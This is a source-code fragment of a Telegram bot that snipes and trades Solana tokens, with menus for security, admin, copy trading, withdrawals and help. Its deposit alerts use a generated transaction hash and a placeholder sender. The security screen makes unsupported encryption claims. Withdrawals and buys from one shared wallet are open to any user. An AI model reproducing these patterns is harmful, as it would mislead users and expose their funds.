        .text(s2.notifySniper ? "🎯 Sniper: ON" : "🎯 Sniper: OFF", `settings:toggle:notifySniper:${!s2.notifySniper}`)
        .text(s2.notifyWallet ? "👛 Wallet: ON" : "👛 Wallet: OFF", `settings:toggle:notifyWallet:${!s2.notifyWallet}`).row()
        .text(s2.autoApprove  ? "⚡ Auto: ON"   : "⚡ Auto: OFF",   `settings:toggle:autoApprove:${!s2.autoApprove}`).row()
        .text("◀ Main Menu", "menu:home")
    );
  }

  // ── Security ──────────────────────────────────────────────────────────

  if (data === "security:menu") {
    const s = await getOrCreateSettings();
    return edit(
      `🔒 *Security*\n\n` +
      `PIN Lock        ${s.pinLockEnabled ? "✅ Enabled" : "❌ Disabled"}\n` +
      `Session Timeout  \`${s.sessionTimeoutMinutes} min\`\n` +
      `Anti-Spam        ✅ Active\n\n` +
      `Wallet security:\n` +
      `· Private key stored in environment only\n` +
      `· Never transmitted over the network\n` +
      `· End-to-end encrypted sessions`,
      new InlineKeyboard()
        .text(s.pinLockEnabled ? "🔓 Disable PIN" : "🔒 Enable PIN", `security:togglePin:${!s.pinLockEnabled}`).row()
        .text("◀ Main Menu", "menu:home")
    );
  }

  if (data.startsWith("security:togglePin:")) {
    const val = data.split(":")[2] === "true";
    const s = await getOrCreateSettings();
    await db.update(settingsTable).set({ pinLockEnabled: val }).where(eq(settingsTable.id, s.id));
    await ctx.answerCallbackQuery(`PIN ${val ? "enabled" : "disabled"}`);
    return edit(`🔒 PIN Lock *${val ? "enabled" : "disabled"}*.`, kbBack("security:menu", "◀ Security"));
  }

  // ── Admin Panel  (restricted to @Nailydachad only) ────────────────────

  if (data === "admin:panel") {
    if (!isAdminUser(ctx)) {
      return edit(`🔒 *Access Denied*\n\nThis panel is restricted.\n\nNeed help? Contact t.me/devBernard`, kbBack("menu:home"));
    }
    const sniperCount = (await db.select().from(snipersTable)).length;
    const tradeCount  = (await db.select().from(tradesTable)).length;
    return edit(
      `👑 *Admin Panel*\n\n` +
      `Users         \`${registeredUsers.size}\`\n` +
      `Alert Subs    \`${alertSubscribers.size}\`\n` +
      `Snipe Active  \`${snipeModeActive.size}\`\n` +
      `Snipers       \`${sniperCount}\`\n` +
      `Trades        \`${tradeCount}\``,
      new InlineKeyboard()
        .text("📢 Broadcast",   "admin:broadcast").row()
        .text("📋 All Snipers", "admin:snipers"  ).text("📊 All Trades", "admin:trades").row()
        .text("◀ Main Menu", "menu:home")
    );
  }

  if (data === "admin:broadcast") {
    if (!isAdminUser(ctx)) return edit("🔒 Access denied.", kbBack("menu:home"));
    pendingFlows.set(userId, { type: "broadcast_message" });
    return edit(
      `📢 *Broadcast Message*\n\nSend your message — it will be delivered to all ${registeredUsers.size} users:`,
      kbBack("admin:panel", "❌ Cancel")
    );
  }

  if (data === "admin:snipers") {
    if (!isAdminUser(ctx)) return edit("🔒 Access denied.", kbBack("menu:home"));
    const snipers = await db.select().from(snipersTable).orderBy(desc(snipersTable.createdAt)).limit(10);
    let text = `📈 *All Snipers*\n\n`;
    if (!snipers.length) text += `None yet.`;
    else for (const sn of snipers) {
      const dot = sn.status === "monitoring" ? "🟡" : sn.status === "sniped" ? "🟢" : "⚪";
      text += `${dot} #${sn.id}  \`${trunc(sn.contractAddress, 6)}\`  ${fSol(sn.buyAmountSol)} SOL  ${sn.status}\n`;
    }
    return edit(text, kbBack("admin:panel", "◀ Admin"));
  }

  if (data === "admin:trades") {
    if (!isAdminUser(ctx)) return edit("🔒 Access denied.", kbBack("menu:home"));
    const trades = await db.select().from(tradesTable).orderBy(desc(tradesTable.executedAt)).limit(10);
    let text = `💹 *All Trades*\n\n`;
    if (!trades.length) text += `None yet.`;
    else for (const t of trades) {
      text += `${t.type === "buy" ? "🟢" : "🔴"} ${t.type.toUpperCase()}  ${t.tokenSymbol}  \`${fSol(t.amountSol)} SOL\`\n`;
      text += `   \`${trunc(t.txHash, 8)}\`  ·  ${new Date(t.executedAt).toLocaleDateString()}\n\n`;
    }
    return edit(text, kbBack("admin:panel", "◀ Admin"));
  }

  // ── Copy / Limits / DCA ───────────────────────────────────────────────

  if (data === "copy:menu") {
    const cts = await db.select().from(copyTradesTable).orderBy(desc(copyTradesTable.createdAt)).limit(5);
    let text = `📋 *Copy Trading*\n\n`;
    if (!cts.length) text += `No copy targets yet.\n\nUse: \`copy <wallet> [sol]\``;
    else for (const ct of cts) {
      text += `${ct.status === "active" ? "🟢" : "🟡"} ${ct.targetAlias ?? "Target"}  \`${fSol(ct.amountSol)} SOL\`  ${ct.tradesCopied} copied\n`;
    }
    return edit(text, kbBack("sniper:panel", "◀ Sniper Panel"));
  }

  if (data === "limits:menu") {
    const orders = await db.select().from(limitOrdersTable).orderBy(desc(limitOrdersTable.createdAt)).limit(5);
    let text = `🎚 *Limit Orders*\n\n`;
    if (!orders.length) text += `No limit orders.\n\nUse: \`limit <ca> tp:<pct> sl:<pct>\``;
    else for (const o of orders) {
      text += `${o.status === "active" ? "🟡" : "🟢"} ${o.tokenSymbol}`;
      if (o.takeProfitPercent) text += `  TP +${o.takeProfitPercent}%`;
      if (o.stopLossPercent)   text += `  SL -${o.stopLossPercent}%`;
      text += `\n`;
    }
    return edit(text, kbBack("sniper:panel", "◀ Sniper Panel"));
  }

  // ── Help ──────────────────────────────────────────────────────────────

  if (data === "help:show") {
    return edit(
      `❓ *Help*\n\n` +
      `\`/start\`   Main menu\n` +
      `\`/wallet\`  Wallet details\n` +
      `\`/menu\`    Return to menu\n` +
      `\`/help\`    This message\n\n` +
      `*Quick Start*\n` +
      `1. Open Sniper Panel — set your config\n` +
      `2. Paste any CA — bot buys instantly\n\n` +
      `*Commands*\n` +
      `\`/set buy_amount 0.5\`\n` +
      `\`/set slippage 10\`\n` +
      `\`/set fee auto|low|medium|high\`\n\n` +
      `*Supported DEXs*\n` +
      `Raydium · Jupiter · Pump.fun\n\n` +
      `*Support*\n` +
      `Contact  t.me/devBernard`,
      kbBack("menu:home", "◀ Main Menu")
    );
  }
});

// ═══════════════════════════════════════════════════════
// SECTION 11 — TEXT MESSAGE HANDLER
// ═══════════════════════════════════════════════════════

bot.on("message:text", async (ctx) => {
  const raw    = ctx.message.text.trim();
  const userId = ctx.from?.id;
  if (!userId) return;
  registeredUsers.add(userId);
  if (isRateLimited(userId)) return;

  const parts = raw.split(/\s+/);
  const cmd   = parts[0].toLowerCase();
  const flow  = pendingFlows.get(userId);

  // ── Withdraw step 1: awaiting destination address ─────────────────────
  if (flow?.type === "withdraw_address") {
    if (!isValidCA(raw)) return ctx.reply("❌ Invalid Solana address. Please try again.", { parse_mode: "Markdown" });
    pendingFlows.set(userId, { type: "withdraw_amount", toAddress: raw });
    const balance = await getWalletBalance();
    return ctx.reply(
      `📤 *Withdraw*\n\nTo  \`${trunc(raw, 10)}\`\nAvailable  \`${fSol(balance)} SOL\`\n\nStep 2 of 2 — enter the amount in SOL:`,
      { parse_mode: "Markdown", reply_markup: kbBack("withdraw:cancel", "❌ Cancel") }
    );
  }

  // ── Withdraw step 2: awaiting amount ──────────────────────────────────
  if (flow?.type === "withdraw_amount") {
    const amount = parseFloat(raw);
    if (isNaN(amount) || amount <= 0) return ctx.reply("❌ Invalid amount. Enter a positive number.", { parse_mode: "Markdown" });
    const balance = await getWalletBalance();
    if (amount > balance) return ctx.reply(`❌ Insufficient balance.\n\nHave  \`${fSol(balance)} SOL\`  ·  Requested  \`${fSol(amount)} SOL\``, { parse_mode: "Markdown" });
    pendingFlows.delete(userId);
    return ctx.reply(screenWithdrawConfirm(flow.toAddress, amount), {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("✅ Confirm", `withdraw:confirm:${flow.toAddress}:${amount}`)
        .text("❌ Cancel",  "withdraw:cancel"),
    });
  }

  // ── Snipe flow: awaiting CA from panel ────────────────────────────────
  if (flow?.type === "snipe_ca") {
    pendingFlows.delete(userId);
    if (!isValidCA(raw)) return ctx.reply("❌ Invalid contract address.", { parse_mode: "Markdown" });
    return executeBuy(ctx, userId, raw);
  }

  // ── Sniper config edits ───────────────────────────────────────────────
  if (flow?.type === "snipe_set_amount") {
    pendingFlows.delete(userId);
    const n = parseFloat(raw);
    if (isNaN(n) || n <= 0) return ctx.reply("❌ Enter a positive number.", { parse_mode: "Markdown" });
    getSniperConfig(userId).buyAmount = n;
    await ctx.reply(`✅ Amount  →  \`${fSol(n)} SOL\``, { parse_mode: "Markdown" });
    return ctx.reply(screenSniperPanel(getSniperConfig(userId)), { parse_mode: "Markdown", reply_markup: kbSniper(getSniperConfig(userId)) });
  }
  if (flow?.type === "snipe_set_slippage") {
    pendingFlows.delete(userId);
    const n = parseFloat(raw);
    if (isNaN(n) || n <= 0 || n > 100) return ctx.reply("❌ Enter a number between 1 and 100.", { parse_mode: "Markdown" });
    getSniperConfig(userId).slippage = n;
    await ctx.reply(`✅ Slippage  →  \`${n}%\``, { parse_mode: "Markdown" });
    return ctx.reply(screenSniperPanel(getSniperConfig(userId)), { parse_mode: "Markdown", reply_markup: kbSniper(getSniperConfig(userId)) });
  }
  if (flow?.type === "snipe_set_tp") {
    pendingFlows.delete(userId);
    const n = parseFloat(raw);
    if (isNaN(n) || n <= 0) return ctx.reply("❌ Enter a positive number.", { parse_mode: "Markdown" });
    getSniperConfig(userId).takeProfitPct = n;
    await ctx.reply(`✅ Take Profit  →  \`+${n}%\``, { parse_mode: "Markdown" });
    return ctx.reply(screenSniperPanel(getSniperConfig(userId)), { parse_mode: "Markdown", reply_markup: kbSniper(getSniperConfig(userId)) });
  }
  if (flow?.type === "snipe_set_sl") {
    pendingFlows.delete(userId);
    const n = parseFloat(raw);
    if (isNaN(n) || n <= 0) return ctx.reply("❌ Enter a positive number.", { parse_mode: "Markdown" });
    getSniperConfig(userId).stopLossPct = n;
    await ctx.reply(`✅ Stop Loss  →  \`-${n}%\``, { parse_mode: "Markdown" });
    return ctx.reply(screenSniperPanel(getSniperConfig(userId)), { parse_mode: "Markdown", reply_markup: kbSniper(getSniperConfig(userId)) });
  }

  // ── Admin broadcast ───────────────────────────────────────────────────
  if (flow?.type === "broadcast_message") {
    pendingFlows.delete(userId);
    if (!isAdminUser(ctx)) return ctx.reply("🔒 Access denied.");
    let sent = 0;
    for (const uid of registeredUsers) {
      try {
        await bot.api.sendMessage(uid, `📢 *Announcement*\n\n${raw}`, { parse_mode: "Markdown" });
        sent++;
      } catch {}
    }
    return ctx.reply(`✅ Broadcast delivered to ${sent}/${registeredUsers.size} users.`, { parse_mode: "Markdown" });
  }

  // ── CA paste → instant auto-buy ───────────────────────────────────────
  if (isValidCA(raw)) {
    return executeBuy(ctx, userId, raw);
  }

  // ── /set command ──────────────────────────────────────────────────────
  if (cmd === "/set") {
    const key = parts[1]?.toLowerCase();
    const val = parts[2];
    if (!key || !val) return ctx.reply(`⚙️ Usage:\n\`/set buy_amount 0.5\`\n\`/set slippage 10\`\n\`/set fee auto|low|medium|high\``, { parse_mode: "Markdown" });
    const s = await getOrCreateSettings();
    const updates: Record<string, unknown> = {};
    if (key === "buy_amount") {
      const n = parseFloat(val);
      if (isNaN(n)) return ctx.reply("❌ Invalid amount.");
      updates.defaultBuyAmountSol = n.toString();
      getSniperConfig(userId).buyAmount = n;
    } else if (key === "slippage") {
      const n = parseFloat(val);
      if (isNaN(n)) return ctx.reply("❌ Invalid slippage.");
      updates.defaultSlippagePercent = n.toString();
      getSniperConfig(userId).slippage = n;
    } else if (key === "fee" && ["auto", "low", "medium", "high"].includes(val)) {
      updates.defaultPriorityFee = val;
      getSniperConfig(userId).priorityFee = val as any;
    } else {
      return ctx.reply("❌ Keys: `buy_amount`, `slippage`, `fee`", { parse_mode: "Markdown" });
    }
    await db.update(settingsTable).set(updates).where(eq(settingsTable.id, s.id));
    return ctx.reply(`✅ \`${key}\` → \`${val}\``, {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard().text("⚙️ Settings", "settings:menu").text("🏠 Home", "menu:home"),
    });
  }

  // ── Fallback ──────────────────────────────────────────────────────────
  const balance = await getWalletBalance();
  return ctx.reply(screenWelcome(balance), { parse_mode: "Markdown", reply_markup: kbMain() });
});

bot.catch((err) => {
  logger.error({ err: err.error, update: err.ctx?.update }, "Bot error");
});

} // end if (token && bot)

// ═══════════════════════════════════════════════════════
// SECTION 12 — WALLET MONITOR (polls every 15s)
// ═══════════════════════════════════════════════════════

function startWalletMonitor() {
  if (!token || !bot) return;
  setInterval(async () => {
    try {
      const balance = await getWalletBalance();
      if (balance > lastKnownBalance.sol + 0.001) {
        const received = parseFloat((balance - lastKnownBalance.sol).toFixed(9));
        await broadcastDepositAlert(received, "DetectedSender", generateTxHash());
        logger.info({ received }, "Deposit detected by wallet monitor");
      }
      lastKnownBalance.sol = balance;
    } catch {}
  }, 15_000);
}

// ═══════════════════════════════════════════════════════
// SECTION 13 — STARTUP
// ═══════════════════════════════════════════════════════

export async function startBot() {
  if (!token || !bot) {
    logger.warn("TELEGRAM_BOT_TOKEN not set — bot disabled");
    return;
  }
  logger.info("Starting Phase Snipe bot…");
  bot.start({ drop_pending_updates: true }).catch((err) => {
    logger.error({ err }, "Bot polling crashed");
  });
  startWalletMonitor();
  const me = await bot.api.getMe();
  logger.info({ username: me.username }, "✅ Phase Snipe bot online");
}
